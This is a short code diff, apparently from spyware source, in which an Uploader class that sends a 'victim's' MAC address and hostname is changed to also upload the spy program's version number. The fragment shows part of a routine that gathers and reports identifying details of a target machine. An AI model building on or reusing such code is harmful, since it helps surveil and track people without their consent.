@@ -51,10 +51,11 @@ void Uploader::upload_hostname()
 void Uploader::upload_victim_info()
 {
 	upload_mac();
+	upload_spy_version();
 	upload_hostname();
 }
 
-void Uploader::upload_version()
+void Uploader::upload_spy_version()
 {
 	send_header(SPY_UPL_HEADER_VER, 3);
 	const byte ver[] = { SPY_MAJOR_VERSION, SPY_MINOR_VERSION, SPY_REVISION };
